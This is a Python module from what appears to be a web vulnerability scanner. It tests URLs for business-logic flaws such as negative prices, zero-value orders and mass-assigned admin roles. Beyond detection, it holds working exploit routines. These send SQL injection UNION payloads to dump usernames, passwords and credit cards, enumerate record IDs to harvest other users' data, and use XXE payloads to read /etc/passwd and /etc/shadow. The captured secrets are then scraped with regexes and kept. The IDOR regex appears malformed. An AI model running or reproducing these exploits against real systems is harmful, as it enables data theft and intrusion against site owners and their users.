import asyncio
import os
import json
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs
from .config import Vulnerability
from .request_engine import RequestEngine


class BusinessLogicDetector:
    def __init__(self, request_engine: RequestEngine, config):
        self.request_engine = request_engine
        self.config = config
        self.payloads_dir = os.path.join(os.path.dirname(__file__), "..", "payloads")
        self.total_requests = 0
        self.exploited_data = []

    def _load_payloads(self) -> List[str]:
        filepath = os.path.join(self.payloads_dir, "business_logic.txt")
        if os.path.exists(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]
        return []

    def _create_vulnerability(self, vuln_type: str, severity: str, endpoint: str,
                              method: str, payload: str, evidence: str,
                              description: str, recommendation: str,
                              exploited_data: List[Dict] = None) -> Vulnerability:
        vuln = Vulnerability(
            type=vuln_type,
            severity=severity,
            endpoint=endpoint,
            method=method,
            payload=payload,
            evidence=evidence,
            description=description,
            recommendation=recommendation
        )
        if exploited_data:
            self.exploited_data.extend(exploited_data)
        return vuln

    async def check_negative_value(self, url: str) -> List[Vulnerability]:
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulns

        numeric_params = []
        for param, values in params.items():
            for val in values:
                try:
                    float(val)
                    numeric_params.append((param, val))
                    break
                except ValueError:
                    continue

        for param, original_val in numeric_params:
            negative_values = ["-1", "-100", "-99999", "0"]
            
            for neg_val in negative_values:
                new_params = params.copy()
                new_params[param] = [neg_val]
                from urllib.parse import urlencode
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                
                self.total_requests += 1
                session_id = await self.request_engine.acquire_session()
                try:
                    response = await self.request_engine.get(test_url, session_id=session_id)
                finally:
                    await self.request_engine.release_session(session_id)
                
                status = response.get("status_code", 0)
                content = response.get("content", "")
                
                if status == 200:
                    if neg_val == "-1" or neg_val == "-100":
                        if "success" in content.lower() or "true" in content.lower() or status == 200:
                            evidence = f"参数 {param} 传入 {neg_val} 后返回成功状态，可能存在负数金额/数量漏洞"
                            vuln = self._create_vulnerability(
                                "Business Logic - Negative Value",
                                "high",
                                test_url,
                                "GET",
                                f"{param}={neg_val}",
                                evidence,
                                f"业务逻辑漏洞：参数 {param} 允许负数输入，可能导致金额计算错误或库存异常",
                                "服务端验证参数范围，不允许负数输入，或在数据库层面设置CHECK约束"
                            )
                            vulns.append(vuln)
                            break
                    elif neg_val == "0":
                        if "success" in content.lower() or len(content) > 50:
                            evidence = f"参数 {param} 传入 0 后成功处理，可能存在0元购买漏洞"
                            vuln = self._create_vulnerability(
                                "Business Logic - Zero Value",
                                "high",
                                test_url,
                                "GET",
                                f"{param}=0",
                                evidence,
                                f"业务逻辑漏洞：参数 {param} 允许0值，可能导致0元支付漏洞",
                                "服务端验证参数最小值，价格类参数必须大于0"
                            )
                            vulns.append(vuln)
                            break
        return vulns

    async def check_overflow_value(self, url: str) -> List[Vulnerability]:
        vulns = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return vulns

        overflow_vals = ["999999999999999", "1e30", "9999999999999999999999999999"]
        
        for param in params:
            for overflow_val in overflow_vals:
                new_params = params.copy()
                new_params[param] = [overflow_val]
                from urllib.parse import urlencode
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                
                self.total_requests += 1
                session_id = await self.request_engine.acquire_session()
                try:
                    response = await self.request_engine.get(test_url, session_id=session_id)
                finally:
                    await self.request_engine.release_session(session_id)
                
                status = response.get("status_code", 0)
                content = response.get("content", "")
                
                if status == 500 or "overflow" in content.lower() or "out of range" in content.lower():
                    evidence = f"参数 {param} 传入超大值 {overflow_val} 后服务器返回500错误，存在整数溢出漏洞"
                    vuln = self._create_vulnerability(
                        "Business Logic - Integer Overflow",
                        "medium",
                        test_url,
                        "GET",
                        f"{param}={overflow_val}",
                        evidence,
                        f"整数溢出漏洞：参数 {param} 无最大值限制，超大值导致服务器错误",
                        "服务端验证参数范围，设置合理的最大值限制，使用安全类型转换"
                    )
                    vulns.append(vuln)
                    break
        return vulns

    async def check_post_business_logic(self, url: str) -> List[Vulnerability]:
        vulns = []
        
        test_cases = [
            {"field": "quantity", "value": -1, "desc": "商品数量负数"},
            {"field": "price", "value": -1, "desc": "价格负数"},
            {"field": "amount", "value": 0, "desc": "金额为0"},
            {"field": "total", "value": 0.0000001, "desc": "金额极小值"},
            {"field": "status", "value": "approved", "desc": "状态篡改"},
            {"field": "role", "value": "admin", "desc": "角色篡改"},
        ]
        
        for test_case in test_cases:
            payload = {test_case["field"]: test_case["value"]}
            
            self.total_requests += 1
            session_id = await self.request_engine.acquire_session()
            try:
                response = await self.request_engine.post(url, json=payload, session_id=session_id)
            finally:
                await self.request_engine.release_session(session_id)
            
            status = response.get("status_code", 0)
            content = response.get("content", "")
            
            if status in [200, 201]:
                content_lower = content.lower()
                if "success" in content_lower or "true" in content_lower or "ok" in content_lower:
                    evidence = f"POST请求设置 {test_case['field']}={test_case['value']} ({test_case['desc']}) 后服务器返回成功"
                    
                    severity = "high" if test_case["field"] in ["price", "amount", "total"] else "medium"
                    
                    vuln = self._create_vulnerability(
                        f"Business Logic - {test_case['desc'].capitalize()}",
                        severity,
                        url,
                        "POST",
                        json.dumps(payload, ensure_ascii=False),
                        evidence,
                        f"业务逻辑漏洞：{test_case['desc']} - 服务端未验证字段 {test_case['field']} 的合法性",
                        f"服务端严格验证所有输入字段，{test_case['field']} 字段设置合理的取值范围，不接受恶意篡改值"
                    )
                    vulns.append(vuln)
        return vulns

    async def check_mass_assignment(self, url: str) -> List[Vulnerability]:
        vulns = []
        
        sensitive_fields = [
            "is_admin", "role", "admin", "approved", "verified",
            "status", "balance", "points", "credit", "vip"
        ]
        
        for field in sensitive_fields:
            payload = {field: True}
            
            self.total_requests += 1
            session_id = await self.request_engine.acquire_session()
            try:
                response = await self.request_engine.post(url, json=payload, session_id=session_id)
            finally:
                await self.request_engine.release_session(session_id)
            
            status = response.get("status_code", 0)
            
            if status in [200, 201]:
                evidence = f"批量赋值漏洞：字段 {field} 可被恶意修改"
                vuln = self._create_vulnerability(
                    "Business Logic - Mass Assignment",
                    "high",
                    url,
                    "POST",
                    json.dumps(payload, ensure_ascii=False),
                    evidence,
                    f"批量赋值漏洞：敏感字段 {field} 可通过请求直接修改",
                    "使用DTO（数据传输对象）显式定义可修改字段，禁止直接将请求参数绑定到数据库模型"
                )
                vulns.append(vuln)
        
        return vulns

    async def check_price_manipulation(self, url: str) -> List[Vulnerability]:
        vulns = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        price_fields = ["price", "amount", "total", "cost", "fee"]
        
        for param in params:
            param_lower = param.lower()
            if any(pf in param_lower for pf in price_fields):
                manipulations = [
                    ("0.0000001", "极小值"),
                    ("0", "零值"),
                    ("-999", "负值"),
                ]
                
                for manip_val, desc in manipulations:
                    new_params = params.copy()
                    new_params[param] = [manip_val]
                    from urllib.parse import urlencode
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                    
                    self.total_requests += 1
                    session_id = await self.request_engine.acquire_session()
                    try:
                        response = await self.request_engine.get(test_url, session_id=session_id)
                    finally:
                        await self.request_engine.release_session(session_id)
                    
                    status = response.get("status_code", 0)
                    if status == 200:
                        evidence = f"价格参数 {param} 被篡改 {desc} ({manip_val}) 后服务器正常处理"
                        vuln = self._create_vulnerability(
                            f"Business Logic - Price Manipulation ({desc})",
                            "critical",
                            test_url,
                            "GET",
                            f"{param}={manip_val}",
                            evidence,
                            f"价格操纵漏洞：参数 {param} 可被篡改{desc}，可能导致经济损失",
                            "价格等敏感数据应从后端数据库读取，不接受前端传入；或使用签名校验防止篡改"
                        )
                        vulns.append(vuln)
                        break
        return vulns

    async def exploit_data_exfiltration(self, vuln: Vulnerability) -> List[Dict[str, Any]]:
        exploited = []
        
        try:
            if "SQL Injection" in vuln.type:
                exploited = await self._exploit_sql_injection(vuln)
            elif "IDOR" in vuln.type:
                exploited = await self._exploit_idor(vuln)
            elif "XXE" in vuln.type:
                exploited = await self._exploit_xxe(vuln)
            elif "Business Logic" in vuln.type:
                exploited = await self._exploit_business_logic(vuln)
        except Exception as e:
            print(f"Exploit failed: {e}")
        
        return exploited

    async def _exploit_sql_injection(self, vuln: Vulnerability) -> List[Dict[str, Any]]:
        exploited = []
        exploit_payloads = [
            "' UNION SELECT username, password FROM users--",
            "' UNION SELECT email, credit_card FROM users--",
            "' UNION SELECT table_name, column_name FROM information_schema.columns--",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 ORDER BY 10--",
        ]
        
        parsed = urlparse(vuln.endpoint)
        params = parse_qs(parsed.query)
        
        for param in params:
            for exploit_payload in exploit_payloads:
                new_params = params.copy()
                new_params[param] = [exploit_payload]
                from urllib.parse import urlencode
                exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                
                self.total_requests += 1
                session_id = await self.request_engine.acquire_session()
                try:
                    response = await self.request_engine.get(exploit_url, session_id=session_id)
                finally:
                    await self.request_engine.release_session(session_id)
                
                content = response.get("content", "")
                
                sensitive_patterns = [
                    (r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "email"),
                    (r"\b\d{16}\b", "credit_card"),
                    (r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", "email"),
                    (r"password['\"]?\s*[:=]\s*['\"]?([^'\"]+)", "password"),
                    (r"username['\"]?\s*[:=]\s*['\"]?([^'\"]+)", "username"),
                ]
                
                for pattern, data_type in sensitive_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches[:5]:
                        exploited.append({
                            "type": data_type,
                            "data": str(match)[:100],
                            "url": exploit_url,
                            "payload": exploit_payload[:50]
                        })
                
                if len(exploited) >= 10:
                    break
            if len(exploited) >= 10:
                break
        
        return exploited

    async def _exploit_idor(self, vuln: Vulnerability) -> List[Dict[str, Any]]:
        exploited = []
        
        parsed = urlparse(vuln.endpoint)
        id_pattern = r'(/|=)(\d+)(/|$|&|?)'
        matches = re.findall(id_pattern, vuln.endpoint)
        
        if matches:
            for id_val in range(1, 50):
                for match in matches:
                    original_id = match[1]
                    exploit_url = vuln.endpoint.replace(original_id, str(id_val))
                    
                    self.total_requests += 1
                    session_id = await self.request_engine.acquire_session()
                    try:
                        response = await self.request_engine.get(exploit_url, session_id=session_id)
                    finally:
                        await self.request_engine.release_session(session_id)
                    
                    status = response.get("status_code", 0)
                    content = response.get("content", "")
                    
                    if status == 200 and len(content) > 100:
                        data_preview = content[:200].replace("\n", " ")
                        exploited.append({
                            "type": "user_data",
                            "accessed_id": id_val,
                            "url": exploit_url,
                            "data_preview": data_preview
                        })
                    
                    if len(exploited) >= 20:
                        break
                if len(exploited) >= 20:
                    break
        
        return exploited

    async def _exploit_xxe(self, vuln: Vulnerability) -> List[Dict[str, Any]]:
        exploited = []
        
        exploit_payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>
<foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/shadow" >
]>
<foo>&xxe;</foo>""",
        ]
        
        for payload in exploit_payloads:
            self.total_requests += 1
            session_id = await self.request_engine.acquire_session()
            try:
                headers = {"Content-Type": "application/xml"}
                response = await self.request_engine.post(vuln.endpoint, data=payload, headers=headers, session_id=session_id)
            finally:
                await self.request_engine.release_session(session_id)
            
            content = response.get("content", "")
            
            if "root:x:" in content or "[fonts]" in content or "shadow" in content.lower():
                exploited.append({
                    "type": "file_read",
                    "file": "/etc/passwd or /etc/shadow or C:\\windows\\win.ini",
                    "url": vuln.endpoint,
                    "data_preview": content[:300]
                })
        
        return exploited

    async def _exploit_business_logic(self, vuln: Vulnerability) -> List[Dict[str, Any]]:
        exploited = []
        
        parsed = urlparse(vuln.endpoint)
        params = parse_qs(parsed.query)
        
        for param in params:
            exploit_tests = [
                ("-99999", "negative_order"),
                ("0", "free_order"),
                ("999999999", "inventory_overload"),
            ]
            
            for exploit_val, exploit_type in exploit_tests:
                new_params = params.copy()
                new_params[param] = [exploit_val]
                from urllib.parse import urlencode
                exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(new_params, doseq=True)}"
                
                self.total_requests += 1
                session_id = await self.request_engine.acquire_session()
                try:
                    response = await self.request_engine.get(exploit_url, session_id=session_id)
                finally:
                    await self.request_engine.release_session(session_id)
                
                status = response.get("status_code", 0)
                content = response.get("content", "")
                
                if status in [200, 201]:
                    exploited.append({
                        "type": exploit_type,
                        "url": exploit_url,
                        "parameter": param,
                        "value": exploit_val,
                        "status_code": status,
                        "response_preview": content[:200]
                    })
                
                if len(exploited) >= 10:
                    break
            if len(exploited) >= 10:
                break
        
        return exploited

    async def scan_endpoint(self, url: str) -> List[Vulnerability]:
        all_vulns = []
        
        session_id = await self.request_engine.acquire_session()
        try:
            all_vulns.extend(await self.check_negative_value(url))
            all_vulns.extend(await self.check_overflow_value(url))
            all_vulns.extend(await self.check_price_manipulation(url))
            all_vulns.extend(await self.check_post_business_logic(url))
            all_vulns.extend(await self.check_mass_assignment(url))
        finally:
            await self.request_engine.release_session(session_id)
        
        return all_vulns

    def get_exploited_data(self) -> List[Dict[str, Any]]:
        return self.exploited_data.copy()
